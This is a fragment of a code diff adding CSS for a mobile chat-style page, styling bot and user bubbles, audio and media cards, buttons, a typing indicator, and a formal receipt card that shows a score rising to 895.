+        background: #fafafb;
+        border-bottom: 1px solid var(--line);
+        color: var(--muted);
+        font-size: 11px;
+        padding: 6px 15px;
+      }
+      .proto-bar strong {
+        color: var(--pink);
+        font-weight: 700;
+        letter-spacing: 0.3px;
+      }
+      .proto-sep {
+        color: #d3d3d8;
+      }
+
+      /* ============================================================
+         FEED
+         ============================================================ */
+      .feed {
+        flex: 1;
+        overflow-y: auto;
+        overflow-x: hidden;
+        padding: 14px 15px 26px;
+        background: #fff;
+      }
+
+      .time-sep {
+        text-align: center;
+        font-size: 11px;
+        color: #9a9ba0;
+        margin: 18px 0 10px;
+      }
+      .time-sep:first-child {
+        margin-top: 2px;
+      }
+
+      .bgroup {
+        position: relative;
+        padding-left: 40px;
+        margin-bottom: 18px;
+      }
+
+      .bot-label {
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        font-size: 11.5px;
+        font-weight: 600;
+        color: #7d7e84;
+        margin-bottom: 7px;
+        padding-left: 2px;
+      }
+      .lab-verified {
+        flex-shrink: 0;
+      }
+
+      .group-avatar {
+        position: absolute;
+        left: 0;
+        bottom: 2px;
+        width: 29px;
+        height: 29px;
+        border-radius: 50%;
+        object-fit: cover;
+        background: #e6e6ea;
+      }
+
+      /* cada bolha tem seu próprio wrapper — o espaçamento vive AQUI */
+      .row-flex {
+        min-width: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        margin-bottom: var(--gap);
+      }
+      .bgroup > .row-flex:last-child {
+        margin-bottom: 0;
+      }
+
+      .msg-row {
+        display: flex;
+        align-items: flex-end;
+        margin-bottom: var(--gap);
+      }
+      .msg-row.user {
+        justify-content: flex-end;
+      }
+
+      .bubble-bot {
+        background: var(--bubble);
+        border-radius: 4px 14px 14px 14px;
+        padding: 11px 14px;
+        font-size: 14px;
+        line-height: 1.55;
+        max-width: 100%;
+        color: #1f2023;
+        overflow-wrap: break-word;
+        animation: bubbleIn 0.24s ease-out;
+      }
+      .bubble-bot strong {
+        font-weight: 700;
+        color: #000;
+      }
+
+      .bubble-user {
+        background: var(--pink);
+        color: #fff;
+        border-radius: 14px 4px 14px 14px;
+        padding: 11px 14px;
+        font-size: 14px;
+        line-height: 1.45;
+        font-weight: 500;
+        max-width: 82%;
+        overflow-wrap: break-word;
+        animation: bubbleIn 0.24s ease-out;
+      }
+
+      .sys-row {
+        display: flex;
+        justify-content: center;
+        margin: 12px 0;
+      }
+      .bubble-system {
+        color: #96979c;
+        font-size: 11px;
+        font-style: italic;
+        text-align: center;
+      }
+
+      .media-box {
+        width: 100%;
+        max-width: 250px;
+      }
+      .chat-img,
+      .chat-video {
+        display: block;
+        width: 100%;
+        border-radius: 12px;
+        border: 1px solid var(--line);
+      }
+      .video-box {
+        position: relative;
+      }
+      .vid-btn {
+        position: absolute;
+        left: 9px;
+        bottom: 10px;
+        width: 34px;
+        height: 34px;
+        border-radius: 50%;
+        border: 0;
+        background: rgba(0, 0, 0, 0.6);
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      /* ============================================================
+         DOCUMENTO FORMAL (comprovante / consulta / proposta)
+         ============================================================ */
+      .doc-card {
+        width: 100%;
+        max-width: 320px;
+        background: #fff;
+        border: 1px solid var(--doc-line);
+        border-radius: 5px;
+        overflow: hidden;
+        color: #111;
+        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+        animation: bubbleIn 0.24s ease-out;
+      }
+
+      .doc-head {
+        display: flex;
+        align-items: flex-start;
+        gap: 8px;
+        padding: 11px 13px 10px;
+        border-bottom: 1.5px solid #111;
+      }
+      .doc-brand {
+        font-size: 10px;
+        font-weight: 800;
+        letter-spacing: 1.3px;
+        text-transform: uppercase;
+        line-height: 1.35;
+        color: #111;
+      }
+      .doc-brand span {
+        display: block;
+        margin-top: 3px;
+        font-size: 8px;
+        font-weight: 500;
+        letter-spacing: 0.5px;
+        text-transform: none;
+        color: #6f7076;
+      }
+      .doc-seal {
+        margin-left: auto;
+        flex-shrink: 0;
+        font-size: 7.5px;
+        font-weight: 700;
+        letter-spacing: 0.8px;
+        text-transform: uppercase;
+        color: #111;
+        border: 1px solid #111;
+        border-radius: 2px;
+        padding: 3px 5px;
+        white-space: nowrap;
+      }
+
+      .doc-strip {
+        background: var(--red);
+        color: #fff;
+        text-align: center;
+        font-size: 10px;
+        font-weight: 800;
+        letter-spacing: 2.2px;
+        text-transform: uppercase;
+        padding: 7px 10px;
+      }
+
+      .doc-body {
+        padding: 4px 13px 10px;
+      }
+      .doc-row {
+        padding: 7px 0;
+        border-bottom: 1px dashed #d9d9dd;
+      }
+      .doc-row:last-child {
+        border-bottom: 0;
+      }
+      .doc-k {
+        font-size: 8px;
+        font-weight: 700;
+        letter-spacing: 1px;
+        text-transform: uppercase;
+        color: #7a7a80;
+      }
+      .doc-v {
+        margin-top: 2px;
+        font-size: 12.5px;
+        font-weight: 700;
+        color: #111;
+        line-height: 1.4;
+        overflow-wrap: break-word;
+      }
+      .doc-v.mono {
+        font-family: ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
+        letter-spacing: 0.4px;
+      }
+      .doc-v.strong {
+        font-size: 13px;
+        letter-spacing: 0.2px;
+      }
+
+      /* linha de evolução do score — 895 no mesmo corpo do documento */
+      .doc-up {
+        display: flex;
+        align-items: baseline;
+        gap: 5px;
+        margin-top: 2px;
+        font-size: 12.5px;
+        font-weight: 700;
+        line-height: 1.4;
+        color: #111;
+      }
+      .du-from {
+        color: #9a9ba0;
+        text-decoration: line-through;
+        text-decoration-thickness: 1.5px;
+      }
+      .du-arrow {
+        color: #111;
+        flex-shrink: 0;
+        align-self: center;
+      }
+      .du-to {
+        color: var(--green);
+        font-weight: 800;
+      }
+      .du-label {
+        font-size: 12.5px;
+        font-weight: 600;
+        color: #6f7076;
+      }
+
+      .doc-foot {
+        border-top: 1.5px solid #111;
+        background: #fafafa;
+        padding: 9px 13px 11px;
+      }
+      .doc-note {
+        font-size: 8.5px;
+        line-height: 1.5;
+        color: #6f7076;
+      }
+      .doc-foot .doc-note {
+        margin-top: 6px;
+      }
+
+      /* ------- blocos ------- */
+      .confirm-card {
+        background: #fafafb;
+        border: 1px solid var(--line);
+        border-radius: 14px;
+        padding: 13px 15px;
+        font-size: 13px;
+        margin-bottom: 9px;
+      }
+      .confirm-title {
+        display: block;
+        font-weight: 700;
+        font-size: 11.5px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        color: var(--muted);
+        margin-bottom: 9px;
+      }
+      .cf-row {
+        display: flex;
+        justify-content: space-between;
+        gap: 10px;
+        padding: 7px 0;
+        border-top: 1px solid #f0f0f2;
+      }
+      .cf-k {
+        color: var(--muted);
+        font-size: 11.5px;
+      }
+      .cf-v {
+        color: var(--ink);
+        font-weight: 600;
+        text-align: right;
+      }
+
+      /* ------- áudio ------- */
+      .audio-card {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        background: #fff;
+        border: 1px solid var(--line);
+        border-radius: 24px;
+        padding: 7px 13px 7px 7px;
+        max-width: 240px;
+      }
+      .audio-btn {
+        width: 32px;
+        height: 32px;
+        flex-shrink: 0;
+        border-radius: 50%;
+        border: 0;
+        background: var(--pink);
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .audio-body {
+        flex: 1;
+        min-width: 0;
+      }
+      .audio-bar {
+        height: 3px;
+        background: #ececee;
+        border-radius: 2px;
+        overflow: hidden;
+        cursor: pointer;
+      }
+      .audio-fill {
+        height: 100%;
+        width: 0%;
+        background: var(--pink);
+      }
+      .audio-time {
+        font-size: 10px;
+        color: var(--muted);
+        font-weight: 500;
+        margin-top: 4px;
+      }
+
+      /* ------- botões ------- */
+      .btn-wrap {
+        margin: 12px 0 2px;
+        max-width: 100%;
+      }
+      .btn-inline {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 8px;
+      }
+      .btn-col {
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+      }
+
+      .chat-btn {
+        background: #fff;
+        border: 1.5px solid var(--pink);
+        color: var(--pink);
+        border-radius: 22px;
+        padding: 9px 16px;
+        font-size: 13px;
+        font-weight: 600;
+        font-family: inherit;
+        cursor: pointer;
+        transition: background 0.12s, color 0.12s;
+      }
+      .chat-btn:hover {
+        background: var(--pink-tint);
+      }
+      .chat-btn.solid {
+        background: var(--pink);
+        color: #fff;
+      }
+      .chat-btn.solid:hover {
+        background: var(--pink-dark);
+        border-color: var(--pink-dark);
+      }
+      .chat-btn.wide {
+        width: 100%;
+        border-radius: 22px;
+        padding: 11px 16px;
+        font-size: 12.5px;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 0.4px;
+        text-align: center;
+      }
+
+      .btn-final {
+        display: block;
+        width: 100%;
+        border: 1.5px solid var(--pink);
+        border-radius: 22px;
+        padding: 12px 16px;
+        font-family: inherit;
+        font-size: 12.5px;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 0.4px;
+        color: #fff;
+        background: var(--pink);
+        cursor: pointer;
+      }
+      .btn-final .bf-sub {
+        display: block;
+        font-size: 10px;
+        font-weight: 500;
+        text-transform: none;
+        letter-spacing: 0;
+        opacity: 0.9;
+        margin-top: 3px;
+      }
+      .btn-final:hover {
+        background: var(--pink-dark);
+        border-color: var(--pink-dark);
+      }
+
+      /* ------- typing (slim e suave) ------- */
+      .typing {
+        display: inline-flex;
+        align-items: center;
+        gap: 3.5px;
+        padding: 10px 13px;
+        background: var(--bubble);
+        border-radius: 4px 14px 14px 14px;
+        margin-bottom: var(--gap);
+        animation: bubbleIn 0.2s ease-out;
+      }
+      .typing span {
+        width: 5px;
+        height: 5px;
+        border-radius: 50%;
+        background: #b3b4ba;
+        animation: dot 1.25s ease-in-out infinite;
+      }
+      .typing span:nth-child(2) {
+        animation-delay: 0.16s;
+      }
+      .typing span:nth-child(3) {
+        animation-delay: 0.32s;
+      }
+
+      /* ============================================================
+         FOOTER
+         ============================================================ */
+      .site-footer {
+        flex-shrink: 0;
+        background: #fbfbfc;
+        border-top: 1px solid var(--line);
+        padding: 7px 15px;
+        padding-bottom: calc(7px + env(safe-area-inset-bottom, 0px));
+      }
+      .foot-links {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 10px;
+        font-size: 10px;
+        color: var(--muted);
+        margin-bottom: 4px;
+      }
+      .foot-copy {
+        color: #a6a6ab;
+        font-size: 9px;
+        line-height: 1.3;
+      }
+
+      @keyframes bubbleIn {
+        from {
+          opacity: 0;
+          transform: translateY(5px);
+        }
+        to {
+          opacity: 1;
+          transform: none;
+        }
+      }
+
+      @keyframes dot {
+        0%, 70%, 100% {
+          transform: translateY(0);
+          opacity: 0.45;
+        }
+        35% {
+          transform: translateY(-3px);
+          opacity: 1;
+        }
+      }
+
+      @media (max-width: 380px) {
+        .bubble-bot { font-size: 13.5px; }
+        .foot-links { font-size: 9.5px; gap: 8px; }
+      }
+    </style>
+  </body>
+</html>
